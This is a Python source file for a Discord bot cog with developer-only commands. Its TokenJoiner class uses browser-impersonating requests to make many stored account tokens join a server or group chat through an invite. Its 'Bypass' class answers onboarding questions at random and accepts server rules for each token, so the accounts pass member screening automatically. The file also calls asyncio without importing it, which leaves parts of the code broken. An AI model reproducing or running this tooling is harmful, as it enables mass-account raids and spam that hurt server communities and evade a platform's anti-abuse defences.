import os
import json
import discord
from discord.ext import commands
from discord.http import Route
from core.globals import UID_1, uid_system
from main import client
from requestcord import HeaderGenerator
from typing import Optional, Any, Dict, TypedDict, List, Tuple
from functools import wraps
from random import uniform, choice, sample, randint
from time import sleep, time
from datetime import datetime
from curl_cffi import requests as curl_requests
import requests
import uuid
import base64

class DeveloperCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.developers = self.load_developers()
        with open('input/config.json', 'r') as f:
            config = json.load(f)
        self.colors = config['colors']
        self.main_color = self.colors['main']
        self.sub_color = self.colors['sub']
        self.reset_color = self.colors['reset']
        self.red_color = "\u001b[1;31m"
        self.green_color = "\u001b[1;32m"
        for cmd in self.get_commands():
            cmd.category = "developer"

    def load_developers(self):
        if os.path.exists('input/developers.json'):
            with open('input/developers.json', 'r') as f:
                return json.load(f)
        return {'developers': {}}

    def save_developers(self):
        with open('input/developers.json', 'w') as f:
            json.dump(self.developers, f, indent=4)

    @commands.command(aliases=['adev'])
    async def adddev(self, ctx, *, args=None):
        """
        Add or update developer with optional restrictions
        Usage: adddev userid
        Aliases: adev
        Notes: UID 1 only
        Restricted developers can ONLY use commands granted via grantcmd (fully dynamic)
        Without any grants, restricted developers can only use help command
        Running on existing developer updates their restriction level
        """
        if ctx.author.id != 1412860807909474406:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ Only the main account (UID 1) can add developers```")
            return
        if not args:
            return
        parts = args.split()
        if not parts:
            return
        user_arg = parts[0]
        restricted = '--restricted' in parts
        # parse user
        if user_arg.startswith('<@') and user_arg.endswith('>'):
            user_id = int(user_arg[2:-1])
        elif user_arg.startswith('<@!') and user_arg.endswith('>'):
            user_id = int(user_arg[3:-1])
        else:
            try:
                user_id = int(user_arg)
            except:
                return
        # add or update
        self.developers['developers'][str(user_id)] = {'restricted': restricted}
        self.save_developers()
        try:
            user = await self.bot.fetch_user(user_id)
        except:
            user = None
        mention = user.mention if user else f"<@{user_id}>"
        main = self.colors['main']
        sub = self.colors['sub']
        reset = self.colors['reset']
        msg = f"""> ```ansi
> {main}─── {sub}DEVELOPER ADDED{main} ───
> {main}User:{reset} {sub}{mention}
> {main}ID:{reset} {sub}{user_id}
> {main}Status:{reset} {sub}{'restricted' if restricted else 'unrestricted'}
> ```"""
        await ctx.send(msg)

    @commands.command()
    async def devlist(self, ctx):
        """List all developers"""
        allowed_users = [UID_1, 1061664535410393148]
        if ctx.author.id not in allowed_users:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ You don't have permission to use this command```")
            return
        devs = self.developers.get('developers', {})
        total = len(devs)
        main = self.colors['main']
        sub = self.colors['sub']
        reset = self.colors['reset']
        if not devs:
            msg = f"""> ```ansi
> {main}─── {sub}DEVELOPER LIST{main} ───
> {main}Total:{reset} {sub}0 developers
> ```"""
            await ctx.send(msg)
            return
        msg = f"""> ```ansi
> {main}─── {sub}DEVELOPER LIST{main} ───
> {main}Total:{reset} {sub}{total} developers
"""
        for uid in devs:
            try:
                user = await self.bot.fetch_user(int(uid))
            except:
                user = None
            status = 'restricted' if devs[uid]['restricted'] else 'unrestricted'
            if user:
                msg += f"> {sub}{uid} {user.display_name} {main}- {sub}{status}\n"
            else:
                msg += f"> {sub}{uid} {main}- {sub}{status}\n"
        msg += "> ```"
        await ctx.send(msg)

    @commands.command()
    async def devremove(self, ctx, user_id: str):
        """Remove a developer"""
        if ctx.author.id != 1412860807909474406:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ You don't have permission to use this command```")
            return
        if user_id in self.developers.get('developers', {}):
            try:
                user = await self.bot.fetch_user(int(user_id))
            except:
                user = None
            name = user.display_name if user else user_id
            del self.developers['developers'][user_id]
            self.save_developers()
            main = self.colors['main']
            sub = self.colors['sub']
            reset = self.colors['reset']
            msg = f"""> ```ansi
> {main}─── {sub}DEVELOPER REMOVED{main} ───
> {main}User:{reset} {sub}{name}
> {main}ID:{reset} {sub}{user_id}
> {main}Status:{reset} {sub}Removed from developers
> ```"""
            await ctx.send(msg)
        else:
            await ctx.send("Not found")

    @commands.command(aliases=['hostuser', 'hm'])
    async def hostmanage(self, ctx, action: str, *args):
        """
        Manage hosts
        Usage: hostmanage <add|remove|list|limit|blacklist|unblacklist|listblacklist> [args]
        Aliases: hostuser, hm
        """
        allowed_users = [1412860807909474406, 1061664535410393148]
        if ctx.author.id not in allowed_users:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ You don't have permission to use this command```")
            return

        if action == 'add':
            if not args:
                return
            user_arg = args[0]
            if user_arg.startswith('<@') and user_arg.endswith('>'):
                user_id = int(user_arg[2:-1])
            elif user_arg.startswith('<@!') and user_arg.endswith('>'):
                user_id = int(user_arg[3:-1])
            else:
                user_id = int(user_arg)
            if 'host_whitelist' not in self.developers:
                self.developers['host_whitelist'] = []
            if user_id not in self.developers['host_whitelist']:
                self.developers['host_whitelist'].append(user_id)
                self.save_developers()
                await ctx.send(f"> ```ansi\n> {self.green_color}✓ Added {user_id} to host whitelist```")
            else:
                await ctx.send(f"> ```ansi\n> {self.red_color}✗ Already in whitelist```")

        elif action == 'remove':
            if not args:
                return
            user_arg = args[0]
            if user_arg.startswith('<@') and user_arg.endswith('>'):
                user_id = int(user_arg[2:-1])
            elif user_arg.startswith('<@!') and user_arg.endswith('>'):
                user_id = int(user_arg[3:-1])
            else:
                user_id = int(user_arg)
            if 'host_whitelist' in self.developers and user_id in self.developers['host_whitelist']:
                self.developers['host_whitelist'].remove(user_id)
                self.save_developers()
                await ctx.send(f"> ```ansi\n> {self.green_color}✓ Removed {user_id} from host whitelist```")
            else:
                await ctx.send(f"> ```ansi\n> {self.red_color}✗ Not in whitelist```")

        elif action == 'list':
            whitelist = self.developers.get('host_whitelist', [])
            if whitelist:
                await ctx.send(f"> ```ansi\n> {self.green_color}Host whitelist: {', '.join(str(uid) for uid in whitelist)}```")
            else:
                await ctx.send(f"> ```ansi\n> {self.red_color}Host whitelist is empty```")

        elif action == 'blacklist':
            if not args:
                return
            user_arg = args[0]
            if user_arg.startswith('<@') and user_arg.endswith('>'):
                user_id = int(user_arg[2:-1])
            elif user_arg.startswith('<@!') and user_arg.endswith('>'):
                user_id = int(user_arg[3:-1])
            else:
                user_id = int(user_arg)
            if 'host_blacklist' not in self.developers:
                self.developers['host_blacklist'] = []
            if user_id not in self.developers['host_blacklist']:
                self.developers['host_blacklist'].append(user_id)
                self.save_developers()
                await ctx.send(f"> ```ansi\n> {self.green_color}✓ Added {user_id} to host blacklist```")
            else:
                await ctx.send(f"> ```ansi\n> {self.red_color}✗ Already in blacklist```")

        elif action == 'unblacklist':
            if not args:
                return
            user_arg = args[0]
            if user_arg.startswith('<@') and user_arg.endswith('>'):
                user_id = int(user_arg[2:-1])
            elif user_arg.startswith('<@!') and user_arg.endswith('>'):
                user_id = int(user_arg[3:-1])
            else:
                user_id = int(user_arg)
            if 'host_blacklist' in self.developers and user_id in self.developers['host_blacklist']:
                self.developers['host_blacklist'].remove(user_id)
                self.save_developers()
                await ctx.send(f"> ```ansi\n> {self.green_color}✓ Removed {user_id} from host blacklist```")
            else:
                await ctx.send(f"> ```ansi\n> {self.red_color}✗ Not in blacklist```")

        elif action == 'listblacklist':
            blacklist = self.developers.get('host_blacklist', [])
            if blacklist:
                await ctx.send(f"> ```ansi\n> {self.green_color}Host blacklist: {', '.join(str(uid) for uid in blacklist)}```")
            else:
                await ctx.send(f"> ```ansi\n> {self.red_color}Host blacklist is empty```")

        else:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ Invalid action. Use add, remove, list, blacklist, unblacklist, listblacklist```")

    @commands.command(aliases=['djoin'])
    async def devjoin(self, ctx, target: str, invite_url: str):
        """
        Join instances to a GC invite
        Usage: devjoin <uid/all/others> <invite_url>
        Aliases: djoin
        Notes: Developer-only command
        Target options: uid (comma-separated), 'all', or 'others' (non-dev instances)
        Uses the provided invite URL to join selected instances
        """
        allowed_users = [1412860807909474406, 1061664535410393148]
        if ctx.author.id not in allowed_users:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ You don't have permission to use this command```")
            return

        # Get selected bots
        from cogs.HostCog import HostCog
        host_cog = self.bot.get_cog('HostCog')
        if not host_cog:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ HostCog not loaded```")
            return

        selected_bots = []
        if target == 'all':
            for bots in host_cog.active_bots.values():
                selected_bots.extend(bots)
        elif target == 'others':
            # For now, same as all
            for bots in host_cog.active_bots.values():
                selected_bots.extend(bots)
        else:
            # Parse uids
            uids = [uid.strip() for uid in target.split(',')]
            for uid in uids:
                instance_name = f"instance_{uid}"
                if instance_name in host_cog.active_bots:
                    selected_bots.extend(host_cog.active_bots[instance_name])

        if not selected_bots:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ No bots selected```")
            return

        # Join each bot using invite via API
        joined = 0
        hg = HeaderGenerator()
        code = invite_url.split('/')[-1]
        for bot in selected_bots:
            try:
                headers = hg.generate_headers(token=bot.token)
                response = requests.post(f"https://discord.com/api/v9/invites/{code}", headers=headers, json={})
                if response.status_code == 200:
                    joined += 1
                await asyncio.sleep(1)  # Rate limit
            except Exception as e:
                pass

        await ctx.send(f"> ```ansi\n> {self.green_color}✓ Joined {joined} instances to the group```")

    @commands.command(aliases=['tjoin'])
    async def devjoinserver(self, ctx, target: str, invite_url: str):
        """
        Join instances to a server invite
        Usage: devjoinserver <uid/all/others> <invite_url>
        Aliases: djoins
        Notes: Developer-only command
        Target options: uid (comma-separated), 'all', or 'others' (non-dev instances)
        Uses the provided invite URL to join selected instances to server
        """
        allowed_users = [1412860807909474406, 1061664535410393148]
        if ctx.author.id not in allowed_users:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ You don't have permission to use this command```")
            return

        # Get selected bots
        from cogs.HostCog import HostCog
        host_cog = self.bot.get_cog('HostCog')
        if not host_cog:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ HostCog not loaded```")
            return

        selected_bots = []
        if target == 'all':
            for bots in host_cog.active_bots.values():
                selected_bots.extend(bots)
        elif target == 'others':
            # For now, same as all
            for bots in host_cog.active_bots.values():
                selected_bots.extend(bots)
        else:
            # Parse uids
            uids = [uid.strip() for uid in target.split(',')]
            for uid in uids:
                instance_name = f"instance_{uid}"
                if instance_name in host_cog.active_bots:
                    selected_bots.extend(host_cog.active_bots[instance_name])

        if not selected_bots:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ No bots selected```")
            return

        # Join each bot using invite via TokenJoiner
        joiner = TokenJoiner()
        code = invite_url.split('/')[-1]
        main = self.colors['main']
        sub = self.colors['sub']
        status_message = await ctx.send(f"```ansi\n> {main}Joining progress:\n> {sub}Successful: {main}0\n> {sub}Failed: {main}0\n> {sub}Last action: {main}Starting...\n```")
        for bot in selected_bots:
            await joiner.accept_invite(bot.token, code, status_message)
            await asyncio.sleep(1)  # Rate limit
        # Final update
        green = "\u001b[1;32m"
        await status_message.edit(content=f"```ansi\n> {green}Joining complete:\n> {sub}Successful: {main}{joiner.joined_count}\n> {sub}Failed: {main}{joiner.not_joined_count}\n```")

    @commands.command()
    async def devtest(self, ctx):
        """Developer test command"""
        allowed_users = [UID_1, 1061664535410393148]
        if ctx.author.id not in allowed_users:
            await ctx.send(f"> ```ansi\n> {self.red_color}✗ You don't have permission to use this command```")
            return
        await ctx.send("Developer command executed!")

class TokenJoiner:
    def __init__(self):
        self._headers = HeaderGenerator()
        self.joined_count = 0
        self.not_joined_count = 0
        self.main_color = "\u001b[1;34m"
        self.sub_color = "\u001b[1;30m"

    async def accept_invite(self, token: str, invite: str, status_message):
        try:
            import string
            import random
            payload = {
                'session_id': ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(16))
            }

            response = curl_requests.post(
                url=f'https://discord.com/api/v10/invites/{invite}',
                headers=self._headers.generate_headers(token),
                json=payload,
                impersonate=self._headers.impersonate_target
            )

            if response.status_code == 200:
                self.joined_count += 1
                status_text = f"Token {token[:5]}... joined successfully"
            else:
                self.not_joined_count += 1
                status_text = f"Token {token[:5]}... failed to join ({response.status_code})"

            await status_message.edit(content=f"```ansi\n> {self.main_color}Joining progress:\n> {self.sub_color}Successful: {self.main_color}{self.joined_count}\n> {self.sub_color}Failed: {self.main_color}{self.not_joined_count}\n> {self.sub_color}Last action: {self.main_color}{status_text}\n```")

        except Exception as e:
            self.not_joined_count += 1
            await status_message.edit(content=f"```ansi\n> {self.main_color}Error with token {token[:5]}...: {str(e)}\n```")

class Bypass:
    _API_BASE: str = "https://discord.com/api/v9"
    _MAX_RETRY_ATTEMPTS: int = 3

    def __init__(self, logger=None):
        self._headers = HeaderGenerator()
        self.logger = logger

    def _handle_rate_limits(func):
        @wraps(func)
        def wrapper(self, *args, **kwargs):
            for attempt in range(self._MAX_RETRY_ATTEMPTS + 1):
                result = func(self, *args, **kwargs)
                if result and result.get('error', {}).get('type') == 'RateLimitExceeded':
                    retry_after = result['error'].get('retry_after', 5)
                    jitter = uniform(0.5, 1.5)
                    sleep_time = retry_after * jitter
                    sleep(sleep_time)
                    continue
                return result
            return result
        return wrapper

    def _process_response(self, response):
        try:
            response_json = response.json() if response.content else {}
        except:
            response_json = {}

        success = 200 <= response.status_code < 300
        result = {
            'success': success,
            'data': response_json,
            'error': {} if success else None,
            'status_code': response.status_code
        }

        if not success:
            error_info = {
                400: ('BadRequest', 'Invalid request format'),
                401: ('AuthenticationError', 'Invalid credentials'),
                403: ('Forbidden', 'Missing permissions'),
                404: ('NotFound', 'Resource not found'),
                429: ('RateLimitExceeded', 'Too many requests')
            }.get(response.status_code,
                ('APIError', f'Request failed with status {response.status_code}'))
            result['error'] = {
                'type': error_info[0],
                'message': response_json.get('message', error_info[1]),
                'code': response_json.get('code'),
                'retry_after': response_json.get('retry_after')
            }

        return result

    @_handle_rate_limits
    def fetch_onboarding_questions(self, token: str, guild_id: str):
        endpoint = f"{self._API_BASE}/guilds/{guild_id}/onboarding"
        try:
            response = curl_requests.get(
                endpoint,
                headers=self._headers.generate_headers(token),
                impersonate=self._headers.impersonate_target
            )
            return self._process_response(response)
        except Exception as e:
            return {
                'success': False,
                'error': {'type': 'ConnectionError', 'message': str(e)},
                'status_code': 0,
                'data': None
            }

    def generate_random_responses(self, questions):
        selected_options = []
        prompts_seen = {}
        options_seen = {}
        current_time = int(time() * 1000)

        for prompt in questions.get("prompts", []):
            prompt_id = str(prompt.get("id"))
            prompts_seen[prompt_id] = current_time

            for option in prompt.get("options", []):
                option_id = str(option["id"])
                options_seen[option_id] = current_time

            if prompt["type"] == 0:
                options = prompt["options"]
                if prompt.get("single_select", True):
                    selected = [choice(options)["id"]]
                else:
                    selected = [opt["id"] for opt in sample(options, k=randint(1, len(options)))]
                selected_options.extend(selected)

        return selected_options, prompts_seen, options_seen

    @_handle_rate_limits
    def onboarding(self, token: str, guild_id: str):
        onboarding_result = self.fetch_onboarding_questions(token, guild_id)
        if not onboarding_result['success']:
            return onboarding_result

        questions = onboarding_result['data']
        responses, prompts_seen, options_seen = self.generate_random_responses(questions)

        payload = {
            "onboarding_responses": responses,
            "onboarding_prompts_seen": prompts_seen,
            "onboarding_responses_seen": options_seen
        }

        endpoint = f"{self._API_BASE}/guilds/{guild_id}/onboarding-responses"
        try:
            response = curl_requests.post(
                endpoint,
                headers=self._headers.generate_headers(token),
                json=payload,
                impersonate=self._headers.impersonate_target
            )
            return self._process_response(response)
        except Exception as e:
            return {
                'success': False,
                'error': {'type': 'ConnectionError', 'message': str(e)},
                'status_code': 0,
                'data': None
            }

    @_handle_rate_limits
    def fetch_server_rules(self, token: str, guild_id: str):
        endpoint = f"{self._API_BASE}/guilds/{guild_id}/member-verification"
        try:
            response = curl_requests.get(
                endpoint,
                headers=self._headers.generate_headers(token),
                impersonate=self._headers.impersonate_target
            )
            return self._process_response(response)
        except Exception as e:
            return {
                'success': False,
                'error': {'type': 'ConnectionError', 'message': str(e)},
                'status_code': 0,
                'data': None
            }

    def generate_rule_response(self, rules_data):
        return {
            "version": rules_data.get("version"),
            "form_fields": [
                {
                    "field_type": field["field_type"],
                    "label": field["label"],
                    "description": field.get("description"),
                    "required": field["required"],
                    "values": field.get("values", []),
                    "response": True
                }
                for field in rules_data.get("form_fields", [])
                if field["field_type"] == "TERMS"
            ]
        }

    @_handle_rate_limits
    def server_rules(self, token: str, guild_id: str):
        rules_result = self.fetch_server_rules(token, guild_id)
        if not rules_result['success']:
            return rules_result

        rules = rules_result['data']
        payload = self.generate_rule_response(rules)
        payload["additional_metadata"] = {
            "nonce": f"{randint(1000, 9999)}:{int(time() * 1000)}",
            "timestamp": datetime.now().isoformat()
        }

        endpoint = f"{self._API_BASE}/guilds/{guild_id}/requests/@me"
        try:
            response = curl_requests.put(
                endpoint,
                headers=self._headers.generate_headers(token),
                json=payload,
                impersonate=self._headers.impersonate_target
            )
            return self._process_response(response)
        except Exception as e:
            return {
                'success': False,
                'error': {'type': 'ConnectionError', 'message': str(e)},
                'status_code': 0,
                'data': None
            }

def setup(bot):
    bot.add_cog(DeveloperCog(bot))
